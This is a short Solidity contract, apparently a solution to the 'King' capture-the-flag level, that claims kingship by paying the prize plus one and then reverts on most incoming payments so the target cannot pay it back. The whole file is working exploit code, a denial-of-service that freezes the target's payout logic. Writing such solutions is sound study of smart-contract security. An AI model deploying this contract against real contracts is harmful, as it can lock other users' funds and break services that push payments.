// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./King.sol";

contract KingHack {
    constructor() payable public {

    }

    function attack(address payable _kingAddress) external {
        //_kingAddress.transfer(msg.value);
        King king = King(_kingAddress);
        uint payAmount = king.prize() + 1;
        (bool result, bytes memory data) = _kingAddress.call{value: payAmount}("");
    }

    receive() external payable {
        require(msg.value > 1 ether);
    }
}